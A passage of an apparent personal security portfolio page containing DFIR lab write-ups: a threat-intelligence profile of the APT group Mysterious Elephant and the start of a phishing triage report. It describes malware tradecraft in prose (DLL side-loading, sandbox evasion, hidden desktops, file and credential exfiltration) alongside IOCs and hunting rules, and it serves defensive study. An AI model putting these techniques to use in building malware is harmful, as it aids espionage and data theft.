@@ -1,0 +1,846 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Lab Documentation &amp; Case Files | Mugerwa Elijah</title><meta name="description" content="Hands-on DFIR investigation case reports from HTB Sherlocks and enterprise security labs. Full forensic triage, log parsing, and detection engineering."><!-- Favicon --><link rel="icon" type="image/png" href="/favicon.png"><link rel="shortcut icon" href="/favicon.png"><link rel="apple-touch-icon" href="/favicon.png"><!-- Image Preload for Instant Hero Loading --><link rel="preload" as="image" href="/potrait.jpg" fetchpriority="high"><!-- Fonts --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet"><script>
+    // Theme initialization to prevent flash
+    const savedTheme = localStorage.getItem('theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', savedTheme);
+  </script><style>.lab-markdown h1,.lab-markdown h2{font-size:1.25rem;font-weight:800;text-transform:uppercase;letter-spacing:.5px;color:var(--text-primary);margin-top:2rem;margin-bottom:.75rem;padding-bottom:.4rem;border-bottom:1px dashed var(--border-subtle);font-family:Fira Code,monospace}.lab-markdown h1:first-child,.lab-markdown h2:first-child{margin-top:0}.lab-markdown h3,.lab-markdown h4{font-size:1rem;font-weight:700;color:var(--accent-active);margin-top:1.25rem;margin-bottom:.5rem;font-family:Fira Code,monospace}.lab-markdown p{color:var(--text-body);line-height:1.75;margin-bottom:1rem}.lab-markdown ul{list-style-type:none;padding-left:0;margin-bottom:1.25rem}.lab-markdown ul li{position:relative;padding-left:1.5rem;margin-bottom:.5rem;color:var(--text-body);line-height:1.6}.lab-markdown ul li:before{content:"▹";position:absolute;left:0;color:var(--accent-active);font-weight:700}.lab-markdown ol{padding-left:1.5rem;margin-bottom:1.25rem}.lab-markdown ol li{margin-bottom:.5rem;color:var(--text-body);line-height:1.6}.lab-markdown strong{color:var(--text-primary);font-weight:700}.lab-markdown blockquote{border-left:3px solid var(--accent-active);padding-left:1rem;margin:1.25rem 0;color:var(--text-body);background:var(--bg-elevated);padding:.75rem 1rem;border-radius:0 4px 4px 0}.lab-markdown table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-size:.85rem;font-family:Fira Code,monospace}.lab-markdown th{background:var(--bg-elevated);color:var(--text-primary);font-weight:700;text-align:left;padding:.6rem .8rem;border:1px solid var(--border-frame);text-transform:uppercase;font-size:.75rem;letter-spacing:.5px}.lab-markdown td{padding:.6rem .8rem;border:1px solid var(--border-subtle);color:var(--text-body)}.lab-markdown tr:nth-child(2n) td{background:var(--glass-fill)}.lab-markdown img{max-width:100%;height:auto;border:1px solid var(--border-frame);border-radius:4px;margin:1.25rem 0;background:var(--bg-elevated)}.lab-markdown pre{background:#111418!important;border:1px solid var(--border-frame)!important;border-radius:6px;padding:1rem 1.25rem;margin:1.25rem 0;overflow-x:auto;font-family:Fira Code,monospace;font-size:.85rem;line-height:1.6}.lab-markdown pre code,.lab-markdown pre span{background:transparent!important;border:none!important;padding:0!important;border-radius:0!important;box-shadow:none!important;font-family:Fira Code,monospace}.lab-markdown :not(pre)>code{font-family:Fira Code,monospace;font-size:.85em;background:var(--bg-elevated);border:1px solid var(--border-subtle);padding:.15rem .4rem;border-radius:3px;color:var(--accent-progress)}.lab-markdown hr{border:none;border-top:1px dashed var(--border-subtle);margin:2rem 0}
+</style>
+<link rel="stylesheet" href="/_astro/index.DwWnvKA7.css"></head> <body class="bg-circuit-pattern min-h-screen text-[var(--text-body)] antialiased"> <canvas id="matrix-canvas" class="fixed inset-0 w-full h-full pointer-events-none" style="z-index: -1; mix-blend-mode: screen; opacity: 0.6;"></canvas> <nav id="main-nav" class="fixed top-5 left-1/2 -translate-x-1/2 z-[9000] px-6 py-3 rounded-full flex items-center gap-6 border border-[var(--glass-border)] bg-[var(--glass-nav)] backdrop-blur-md transition-all duration-500 max-w-[92vw] sm:max-w-fit shadow-lg"> <a href="/#home" class="font-black text-xs uppercase tracking-[2.5px] whitespace-nowrap text-[var(--text-primary)] hover:opacity-80 transition-opacity">
+Mugerwa Elijah
+</a> <div class="hidden md:flex items-center gap-5"> <a href="/#home" class="text-[0.7rem] font-bold uppercase tracking-[1.5px] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors whitespace-nowrap">About</a> <a href="/#journey" class="text-[0.7rem] font-bold uppercase tracking-[1.5px] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors whitespace-nowrap">Journey</a> <a href="/#radar" class="text-[0.7rem] font-bold uppercase tracking-[1.5px] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors whitespace-nowrap">SOC Radar</a> <a href="/#journal" class="text-[0.7rem] font-bold uppercase tracking-[1.5px] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors whitespace-nowrap">Weekly Log</a> <a href="/#case-files" class="text-[0.7rem] font-bold uppercase tracking-[1.5px] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors whitespace-nowrap">Lab Docs</a> <a href="/#projects" class="text-[0.7rem] font-bold uppercase tracking-[1.5px] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors whitespace-nowrap">Projects</a> <a href="/#arsenal" class="text-[0.7rem] font-bold uppercase tracking-[1.5px] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors whitespace-nowrap">Arsenal</a> <a href="/#certificates" class="text-[0.7rem] font-bold uppercase tracking-[1.5px] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors whitespace-nowrap">Certificates</a> </div> <button id="theme-toggle" class="w-8 h-8 rounded-full flex items-center justify-center border border-[var(--border-frame)] bg-[var(--bg-elevated)] text-[var(--text-primary)] hover:scale-110 transition-transform cursor-pointer" aria-label="Toggle Dark/Light Theme"> <span id="theme-icon" class="text-xs">☾</span> </button> </nav> <script type="module">const n=document.getElementById("main-nav"),o=document.getElementById("theme-toggle"),d=document.getElementById("theme-icon");function m(){const e=document.documentElement.getAttribute("data-theme")||"dark";d&&(d.textContent=e==="dark"?"☾":"☼")}m();o?.addEventListener("click",()=>{const t=(document.documentElement.getAttribute("data-theme")||"dark")==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",t),localStorage.setItem("theme",t),m()});window.addEventListener("scroll",()=>{window.scrollY>80?n?.classList.add("shadow-2xl","border-[var(--text-muted)]"):n?.classList.remove("shadow-2xl","border-[var(--text-muted)]")},{passive:!0});</script> <main>  <div class="py-28 max-w-[1100px] mx-auto px-6 sm:px-12 space-y-12"> <!-- Top Navigation / Breadcrumbs --> <div class="flex flex-wrap items-center justify-between gap-4"> <a href="/#case-files" class="inline-flex items-center gap-2 font-mono text-xs font-bold uppercase tracking-wider text-[var(--text-muted)] hover:text-[var(--accent-active)] transition-colors"> <span>←</span> Back to Portfolio
+</a> <span class="font-mono text-xs text-[var(--text-muted)] border border-[var(--border-subtle)] px-3 py-1 bg-[var(--bg-elevated)]"> <strong class="text-[var(--accent-active)]">4</strong> Case Reports Published
+</span> </div> <!-- Main Header --> <div class="cyber-frame p-6 sm:p-10 space-y-4"> <div class="flex items-center gap-3"> <span class="w-2.5 h-2.5 rounded-full bg-[var(--accent-active)] animate-pulse"></span> <span class="text-xs font-mono font-bold uppercase tracking-[4px] text-[var(--text-muted)]">
+DFIR &amp; Threat Intelligence Knowledge Base
+</span> </div> <h1 class="text-3xl sm:text-4xl md:text-5xl font-black uppercase tracking-tight text-[var(--text-primary)] cyber-glow-text cyber-glitch" data-text="LAB DOCUMENTATION.">
+Lab Documentation.
+</h1> <p class="text-sm sm:text-base text-[var(--text-body)] max-w-3xl leading-relaxed">
+Comprehensive repository of hands-on Digital Forensics, Incident Response (DFIR), and Threat Intelligence investigation reports from Hack The Box Sherlocks and enterprise security homelabs. Each report details full forensic triage steps, query structures, Indicators of Compromise (IOCs), and defensive engineering mitigations.
+</p> </div> <!-- Standard Documentation Pipeline Grid --> <div class="cyber-frame p-6 sm:p-8"> <div class="inline-flex items-center gap-2 font-mono text-xs font-bold text-[var(--text-muted)] uppercase tracking-widest mb-4 border border-[var(--border-frame)] px-3 py-1 bg-[var(--bg-elevated)]"> <span class="w-2 h-2 rounded-full bg-[var(--accent-active)] animate-pulse"></span>
+Investigation Standards &amp; Methodology
+</div> <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4 border-t border-[var(--border-subtle)]"> <div class="space-y-1"> <span class="font-mono text-xs font-bold text-[var(--text-primary)] block">01 // Scenario &amp; Scope</span> <p class="text-xs text-[var(--text-muted)]">Alert premise, triage context, and scope definition.</p> </div> <div class="space-y-1"> <span class="font-mono text-xs font-bold text-[var(--text-primary)] block">02 // Tools &amp; Environment</span> <p class="text-xs text-[var(--text-muted)]">Wireshark, Volatility, Zimmerman Tools, VirusTotal, WHOIS.</p> </div> <div class="space-y-1"> <span class="font-mono text-xs font-bold text-[var(--text-primary)] block">03 // Step-by-Step Triage</span> <p class="text-xs text-[var(--text-muted)]">Task analysis, header parsing, payload extraction, and queries.</p> </div> <div class="space-y-1"> <span class="font-mono text-xs font-bold text-[var(--text-primary)] block">04 // Evidence &amp; Defense</span> <p class="text-xs text-[var(--text-muted)]">Extracted IOC tables, MITRE mapping, and SEG/EDR rules.</p> </div> </div> </div> <!-- Published Lab Documentation Reports List --> <div class="space-y-8"> <article class="lab-card cyber-frame p-6 sm:p-8 transition-all" data-lab-id="fortyseven-threat-intelligence"> <!-- Top Badges / Meta --> <div class="flex flex-wrap items-center justify-between gap-3 pb-4 border-b border-[var(--border-subtle)]"> <div class="flex flex-wrap items-center gap-2"> <span class="font-mono text-[0.65rem] font-bold px-3 py-1 bg-[var(--bg-elevated)] border border-[var(--border-frame)] text-[var(--accent-active)] tracking-wider uppercase"> Threat Intelligence / APT Profiling </span> <span class="font-mono text-[0.65rem] font-bold px-2.5 py-1 bg-[var(--accent-progress)]/10 border border-[var(--accent-progress)]/30 text-[var(--accent-progress)] tracking-wider uppercase"> Intermediate </span> </div> <span class="font-mono text-xs text-[var(--text-muted)]"> 24 August 2026 </span> </div> <!-- Title & Summary Toggle Area --> <div class="py-5 cursor-pointer lab-toggle group" role="button" tabindex="0" aria-expanded="true"> <div class="flex items-start justify-between gap-4"> <div> <h2 class="text-xl sm:text-2xl font-extrabold text-[var(--text-primary)] group-hover:text-[var(--accent-active)] transition-colors cyber-glitch" data-text="FortySeven-1 — Mysterious Elephant (APT-K-47) Threat Intelligence Profile"> FortySeven-1 — Mysterious Elephant (APT-K-47) Threat Intelligence Profile </h2> <p class="text-sm text-[var(--text-body)] mt-2 leading-relaxed"> Comprehensive threat actor profiling of Mysterious Elephant (APT-K-47): analyzing Hajj-themed spear-phishing lures, WinRAR CVE-2023-38831 exploitation, ORPCBackdoor DLL hijacking, Asyncshell C2, MemLoader sandbox evasion, and WhatsApp exfiltration tooling. </p> <div class="flex flex-wrap gap-1.5 mt-4"> <span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> OpenCTI / MISP </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> MITRE ATT&amp;CK </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> Kaspersky GREAT Intelligence </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> Knownsec 404 Research </span> </div> </div> <button type="button" class="shrink-0 p-2.5 border border-[var(--border-frame)] bg-[var(--bg-surface)] text-[var(--text-primary)] group-hover:border-[var(--text-primary)] transition-all lab-toggle-btn mt-1 cursor-pointer" aria-label="Toggle full lab writeup"> <span class="font-mono text-xs font-bold block"> ▲ HIDE REPORT </span> </button> </div> </div> <!-- Expandable Report Body Content --> <div class="lab-body overflow-hidden transition-all duration-500 block"> <div class="pt-6 border-t border-[var(--border-subtle)] lab-markdown text-sm sm:text-base"> <h2 id="introduction--scenario">Introduction &#x26; Scenario</h2>
+<p>An Advanced Persistent Threat (APT) group has been identified using Hajj-themed phishing lures to target and exfiltrate WhatsApp data and sensitive communications from government and diplomatic officials. By analyzing and synthesizing fragmented intelligence from public cybersecurity vendor reports, research publications, and internal security feeds, this investigation constructs a comprehensive threat intelligence profile of the adversary.</p>
+<h3 id="intelligence-sources--evidence-base">Intelligence Sources &#x26; Evidence Base</h3>
+<ul>
+<li><strong>Kaspersky GREAT Analysis:</strong> <code>https://securelist.com/mysterious-elephant-apt-ttps-and-tools/117596/</code></li>
+<li><strong>Knownsec 404 Team Research (Part 1):</strong> <code>https://medium.com/@knownsec404team/apt-k-47-mysterious-elephant-a-new-apt-organization-in-south-asia-5c66f954477</code></li>
+<li><strong>Knownsec 404 Team Weaponry Breakdown (Asyncshell):</strong> <code>https://medium.com/@knownsec404team/unveiling-the-past-and-present-of-apt-k-47-weapon-asyncshell-5a98f75c2d68</code></li>
+</ul>
+<hr>
+<h2 id="threat-actor-overview--operational-history">Threat Actor Overview &#x26; Operational History</h2>
+<p><strong>Mysterious Elephant</strong> (also tracked by threat intelligence vendors as <strong>APT-K-47</strong>) is a South Asian cyber-espionage organization active since at least 2022. The group primarily targets diplomatic personnel, government organizations, and military entities, leveraging spear-phishing campaigns (frequently themed around official regional affairs and religious events) to compromise endpoints and exfiltrate sensitive files—with a distinct emphasis on WhatsApp communications, credentials, and confidential documents.</p>
+<p>The group’s operational tradecraft features a hybrid mix of custom-developed implants, modified open-source utilities, and code recycled from or shared with neighboring South Asian threat groups, including Confucius, SideWinder, BITTER, and Origami Elephant.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Profile Field</th><th>Threat Intelligence Attribution</th></tr></thead><tbody><tr><td><strong>Primary Aliases</strong></td><td>Mysterious Elephant, APT-K-47</td></tr><tr><td><strong>Origin / Region</strong></td><td>South Asia</td></tr><tr><td><strong>Activity Period</strong></td><td>2022 – Present (Publicly disclosed by Kaspersky GREAT in 2023)</td></tr><tr><td><strong>Primary Targets</strong></td><td>Diplomatic entities, government organizations, and military institutions (notably within South Asia / Pakistan)</td></tr><tr><td><strong>Motivation</strong></td><td>Strategic Cyber Espionage &#x26; Sensitive Data Theft</td></tr><tr><td><strong>Tooling Overlap</strong></td><td>SideWinder, Confucius, BITTER, Origami Elephant</td></tr></tbody></table>
+<hr>
+<h2 id="technical-analysis--signature-tooling">Technical Analysis &#x26; Signature Tooling</h2>
+<h3 id="1-delivery--initial-access">1. Delivery &#x26; Initial Access</h3>
+<ul>
+<li><strong>Exploitation of Known Vulnerabilities:</strong> Early delivery chains relied on remote template injection and <strong>CVE-2017-11882</strong> (Equation Editor). Modern campaigns utilize malicious WinRAR archives exploiting <strong>CVE-2023-38831</strong> to execute payloads disguised as official meeting minutes or diplomatic notices.</li>
+<li><strong>Vtyrei Downloader:</strong> Recycled downloader module originally tied to Origami Elephant, utilized in early Mysterious Elephant intrusion sets.</li>
+</ul>
+<hr>
+<h3 id="2-backdoor-execution--persistence">2. Backdoor Execution &#x26; Persistence</h3>
+<h4 id="orpcbackdoor">ORPCBackdoor</h4>
+<p>Custom backdoor communicating via Office Remote Procedure Call (ORPC):</p>
+<ul>
+<li><strong>DLL Hijacking:</strong> Utilizes the <code>version.dll</code> template via exported function <code>GetFileVersionInfoByHandleEx(void)</code> to execute under trusted process contexts (e.g., <code>MicrosoftServices</code>).</li>
+<li><strong>Persistence Verification:</strong> Checks whether <code>ts.dat</code> exists in its execution path. If missing, it invokes COM interfaces for TaskScheduler to create a scheduled task named <code>Microsoft Update</code> and drops <code>ts.dat</code> to prevent redundant task creation.</li>
+</ul>
+<h4 id="asyncshell-asyncshell-v2">Asyncshell (Asyncshell-v2)</h4>
+<p>A core custom backdoor maintained since 2023. Recent iterations (v2) upgraded Command-and-Control (C2) channels from raw TCP to encrypted HTTPS to blend with benign enterprise traffic.</p>
+<h4 id="memloader-hidendesk">MemLoader HidenDesk</h4>
+<p>Reflective PE loader deployed via intermediate stagers to execute secondary payloads in memory:</p>
+<ul>
+<li><strong>Sandbox Evasion:</strong> Evaluates system processes upon launch and immediately terminates execution if fewer than <strong>40 active processes</strong> are detected.</li>
+<li><strong>Covert Workspace:</strong> Spawns and switches execution to a hidden desktop session named <code>MalwareTech_Hidden</code>.</li>
+<li><strong>Persistence:</strong> Drops a shortcut file into the Windows Startup autostart directory.</li>
+<li><strong>Payload:</strong> Decrypts embedded shellcode using an RC4-like algorithm to launch commercial remote access trojans (such as Remcos RAT).</li>
+</ul>
+<hr>
+<h3 id="3-exfiltration-modules">3. Exfiltration Modules</h3>
+<p>The threat actor deploys specialized post-exploitation tools designed for recursive directory traversal and targeted data exfiltration over primary C2 channels:</p>
+<ul>
+<li><strong>Stom Exfiltrator:</strong> Recursively scans non-system drives, <code>Desktop</code>, and <code>Downloads</code> folders. Latest variants specifically hunt for hardcoded WhatsApp folder paths to harvest attachments, shared media, and chat archives.</li>
+<li><strong>Uplo Exfiltrator:</strong> Employs depth-first search algorithms to harvest documents (<code>.TXT</code>, <code>.DOCX</code>, <code>.PDF</code>, <code>.XLSX</code>), certificates (<code>.PFX</code>), and contact cards (<code>.VCF</code>) using XOR-deobfuscated C2 endpoints.</li>
+<li><strong>ChromeStealer Exfiltrator:</strong> Custom binary (<code>WhatsAppOB.exe</code>) targeting browser-stored credentials and web session artifacts.</li>
+</ul>
+<hr>
+<h2 id="mitre-attck-framework-mapping">MITRE ATT&#x26;CK Framework Mapping</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Tactic</th><th>Technique / Sub-Technique</th><th>ID</th><th>Observed Artifact / Operational Context</th></tr></thead><tbody><tr><td><strong>Initial Access</strong></td><td>Exploitation for Client Execution</td><td><code>T1203</code></td><td>Exploitation of <code>CVE-2017-11882</code> and <code>CVE-2023-38831</code> archive vulnerabilities.</td></tr><tr><td><strong>Execution</strong></td><td>Command and Scripting Interpreter: PowerShell</td><td><code>T1059.001</code></td><td>Execution of PowerShell scripts for payload staging and operational commands.</td></tr><tr><td><strong>Persistence</strong></td><td>Boot or Logon Autostart Execution: Startup Folder</td><td><code>T1547.001</code></td><td>MemLoader HidenDesk dropping shortcut files into system autostart directories.</td></tr><tr><td><strong>Persistence</strong></td><td>Scheduled Task/Job: Scheduled Task</td><td><code>T1053.005</code></td><td>ORPCBackdoor invoking COM TaskScheduler to create the <code>Microsoft Update</code> task.</td></tr><tr><td><strong>Defense Evasion</strong></td><td>Hijack Execution Flow: DLL Side-Loading</td><td><code>T1574.002</code></td><td>ORPCBackdoor abusing <code>version.dll</code> export functions (<code>GetFileVersionInfoByHandleEx</code>).</td></tr><tr><td><strong>Defense Evasion</strong></td><td>Virtualization / Sandbox Evasion: System Checks</td><td><code>T1497.001</code></td><td>MemLoader terminating execution if active system processes count is &#x3C; 40.</td></tr><tr><td><strong>Defense Evasion</strong></td><td>Hidden Window</td><td><code>T1564.003</code></td><td>Spawning and executing payloads inside hidden desktop session <code>MalwareTech_Hidden</code>.</td></tr><tr><td><strong>Exfiltration</strong></td><td>Exfiltration Over C2 Channel</td><td><code>T1041</code></td><td>Modular exfiltrators (Uplo, Stom, ChromeStealer) transferring stolen files over existing C2 paths.</td></tr></tbody></table>
+<hr>
+<h2 id="indicators-of-compromise-iocs">Indicators of Compromise (IOCs)</h2>
+<h3 id="file-hashes--vulnerabilities">File Hashes &#x26; Vulnerabilities</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Indicator / Vulnerability</th><th>Type</th><th>Context</th></tr></thead><tbody><tr><td><code>9e50adb6107067ff0bab73307f5499b6</code></td><td>MD5</td><td>ChromeStealer Exfiltrator (<code>WhatsAppOB.exe</code>)</td></tr><tr><td><code>CVE-2023-38831</code></td><td>CVE</td><td>WinRAR File Extension Spoofing / Code Execution</td></tr><tr><td><code>CVE-2017-11882</code></td><td>CVE</td><td>Microsoft Office Equation Editor Memory Corruption</td></tr></tbody></table>
+<h3 id="host--execution-artifacts">Host &#x26; Execution Artifacts</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Artifact</th><th>Category</th><th>Operational Function</th></tr></thead><tbody><tr><td><code>Microsoft Update</code></td><td>Scheduled Task</td><td>Persistence task created by ORPCBackdoor</td></tr><tr><td><code>ts.dat</code></td><td>Marker File</td><td>State check file preventing redundant scheduled task creation</td></tr><tr><td><code>MalwareTech_Hidden</code></td><td>Hidden Desktop</td><td>Covert desktop environment used by MemLoader to hide UI</td></tr><tr><td><code>GetFileVersionInfoByHandleEx</code></td><td>DLL Export</td><td>Export function abused in <code>version.dll</code> hijacking chain</td></tr></tbody></table>
+<hr>
+<h2 id="key-takeaways--threat-hunting-rules">Key Takeaways &#x26; Threat Hunting Rules</h2>
+<ol>
+<li><strong>Monitor DLL Side-Loading on <code>version.dll</code>:</strong> Flag non-standard binaries loading <code>version.dll</code> from user-writable directories or unexpected export calls to <code>GetFileVersionInfoByHandleEx</code>.</li>
+<li><strong>Scheduled Task Auditing:</strong> Alert on newly registered scheduled tasks named <code>Microsoft Update</code> that do not originate from verified Windows Update binaries.</li>
+<li><strong>Hidden Desktop Detection:</strong> Instrument EDR rules to identify processes invoking <code>CreateDesktop</code> / <code>SetThreadDesktop</code> targeting hidden sessions (<code>MalwareTech_Hidden</code>).</li>
+<li><strong>WhatsApp Attachment Directory Monitoring:</strong> Monitor unauthorized processes recursively enumerating <code>WhatsApp</code> desktop data stores or staging archives of <code>.PFX</code>, <code>.VCF</code>, and <code>.DOCX</code> files.</li>
+</ol> </div> </div> </article><article class="lab-card cyber-frame p-6 sm:p-8 transition-all" data-lab-id="phishing-incident-response"> <!-- Top Badges / Meta --> <div class="flex flex-wrap items-center justify-between gap-3 pb-4 border-b border-[var(--border-subtle)]"> <div class="flex flex-wrap items-center gap-2"> <span class="font-mono text-[0.65rem] font-bold px-3 py-1 bg-[var(--bg-elevated)] border border-[var(--border-frame)] text-[var(--accent-active)] tracking-wider uppercase"> BTL1 Practical Lab </span> <span class="font-mono text-[0.65rem] font-bold px-2.5 py-1 bg-[var(--accent-progress)]/10 border border-[var(--accent-progress)]/30 text-[var(--accent-progress)] tracking-wider uppercase"> Intermediate </span> </div> <span class="font-mono text-xs text-[var(--text-muted)]"> 17 August 2026 </span> </div> <!-- Title & Summary Toggle Area --> <div class="py-5 cursor-pointer lab-toggle group" role="button" tabindex="0" aria-expanded="false"> <div class="flex items-start justify-between gap-4"> <div> <h2 class="text-xl sm:text-2xl font-extrabold text-[var(--text-primary)] group-hover:text-[var(--accent-active)] transition-colors cyber-glitch" data-text="Phishing Incident Response &#38; Email Header Triage"> Phishing Incident Response &amp; Email Header Triage </h2> <p class="text-sm text-[var(--text-body)] mt-2 leading-relaxed"> Full-lifecycle phishing investigation: distinguishing malicious emails from spam/scams, raw RFC 822 email header extraction, reverse DNS lookup, credential harvester analysis, and VirusTotal trojan payload hashing. </p> <div class="flex flex-wrap gap-1.5 mt-4"> <span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> Sublime Text </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> WHOIS (DomainTools) </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> URL2PNG </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> VirusTotal </span><span class="font-mono text-[0.65rem] px-2 py-0.5 bg-[var(--bg-elevated)] border border-[var(--border-subtle)] text-[var(--text-muted)]"> Thunderbird </span> </div> </div> <button type="button" class="shrink-0 p-2.5 border border-[var(--border-frame)] bg-[var(--bg-surface)] text-[var(--text-primary)] group-hover:border-[var(--text-primary)] transition-all lab-toggle-btn mt-1 cursor-pointer" aria-label="Toggle full lab writeup"> <span class="font-mono text-xs font-bold block"> ▼ READ REPORT </span> </button> </div> </div> <!-- Expandable Report Body Content --> <div class="lab-body overflow-hidden transition-all duration-500 hidden"> <div class="pt-6 border-t border-[var(--border-subtle)] lab-markdown text-sm sm:text-base"> <h2 id="overview--objectives">Overview &#x26; Objectives</h2>
+<p>This investigation covers the complete lifecycle of a Security Operations Center (SOC) phishing incident response triage:</p>
+<ul>
+<li><strong>Triage &#x26; Classification:</strong> Evaluating raw email artifacts and determining intent (Malicious vs. Spam/Scam).</li>
+<li><strong>Header Forensics:</strong> Parsing RFC 822 email headers to identify spoofed senders, relay hops, timestamps, and authentic origin IPs.</li>
+<li><strong>Payload &#x26; URL Analysis:</strong> Extracting credential-harvesting links and analyzing malicious attachments disguised via double extensions (<code>.pdf.exe</code>).</li>
+<li><strong>Defensive Engineering:</strong> Formulating actionable Secure Email Gateway (SEG), Firewall, and EDR blocklist rules to protect enterprise infrastructure.</li>
+</ul>
+<hr>
+<h2 id="incident-scenario">Incident Scenario</h2>
+<blockquote>
+<p><strong>Security Operations Alert:</strong> A batch of five suspicious emails was retrieved from employee inboxes. The objective is to analyze all artifacts, identify malicious campaigns posing an operational threat, extract Indicators of Compromise (IOCs), and produce a defensive mitigation report.</p>
+</blockquote>
+<hr>
+<h2 id="step-by-step-investigation--analysis">Step-by-Step Investigation &#x26; Analysis</h2>
+<h3 id="email-triage--classification">Email Triage &#x26; Classification</h3>
+<h4 id="email-1-credential-harvester-amazon-order-impersonation--malicious">Email 1: Credential Harvester (Amazon Order Impersonation) — <strong>[MALICIOUS]</strong></h4>
+<p><img src="https://d2y9h8w1ydnujs.cloudfront.net/uploads/content/images/5cb8417d54e79194392f474121e1e07feab414b1de9d3aa600240cf327ba725d346d1536ae6e12c43a16dfae9571.PNG" alt=""></p>
+<p><strong>Key Indicators:</strong></p>
+<ul>
+<li><strong>Sender Spoofing:</strong> Display header claims <code>auto-confirm.info-amazon.co.uk</code>, but the envelope sender is <code>QPE77756@mun.ca</code>.</li>
+<li><strong>Inconsistent Branding:</strong> Uses unstandardized fonts and poor grammar (<code>Your ID</code>, <code>From Amazon Store</code>).</li>
+<li><strong>Targeting:</strong> Addressed to generic <code>Amazon user</code>.</li>
+<li><strong>Call-to-Action:</strong> Directs the user to an external refund page intended for credential harvesting.</li>
+</ul>
+<h4 id="email-2-lottery-advance-fee-scam--non-malicious--spam">Email 2: Lottery Advance-Fee Scam — <strong>[NON-MALICIOUS / SPAM]</strong></h4>
+<p><img src="https://d2y9h8w1ydnujs.cloudfront.net/uploads/content/images/b9319fd06f75f7fdf6405d20bf08efd2937d52c658ea7db35aaf492bfb46e72da74b67b821d00df0793ae13fa463.PNG" alt=""></p>
+<p><strong>Analysis:</strong></p>
+<ul>
+<li>Generic spam soliciting personal details via a free Gmail address, referencing a legitimate Scottish news article. No malware payloads or active exploit links detected.</li>
+</ul>
+<h4 id="email-3-nhs-covid-19-trojan-delivery--malicious">Email 3: NHS COVID-19 Trojan Delivery — <strong>[MALICIOUS]</strong></h4>
+<p><img src="https://d2y9h8w1ydnujs.cloudfront.net/uploads/content/images/b84844779cdc76783986f513835bcb9197473bd5ba9132bf976d6e2fadbd8477b8bab720505755d8b28242344766.PNG" alt=""></p>
+<p><strong>Key Indicators:</strong></p>
+<ul>
+<li><strong>Sender Mismatch:</strong> Originates from a public Gmail address (<code>FSDFAS2423N23K@gmail.com</code>) claiming to represent the UK National Health Service (NHS).</li>
+<li><strong>Psychological Urgency:</strong> Creates artificial time pressure (<em>“If you do not act soon, we will give your slot to someone else”</em>).</li>
+<li><strong>Malicious Attachment:</strong> SEG replaced original executable attachment with a quarantine notice. Analysis reveals a double-extension executable (<code>.pdf.exe</code>).</li>
+</ul>
+<p><img src="https://d2y9h8w1ydnujs.cloudfront.net/uploads/content/images/1ccc38b28b364a6b5a484fde960e81ac8f0437c1a8d584b863866e277a23ac9b74bd80d88937f4ac706f9ee75538.PNG" alt=""></p>
+<h4 id="emails-4--5-spam-newsletters--crypto-marketing--non-malicious--spam">Emails 4 &#x26; 5: Spam Newsletters &#x26; Crypto Marketing — <strong>[NON-MALICIOUS / SPAM]</strong></h4>
+<ul>
+<li>Standard marketing spam and cryptocurrency trade promotions; no embedded exploits or active weaponized payloads.</li>
+</ul>
+<hr>
+<h3 id="technical-artifact-extractions">Technical Artifact Extractions</h3>
+<h4 id="incident-1-amazon-phishing-artifacts">Incident #1: Amazon Phishing Artifacts</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
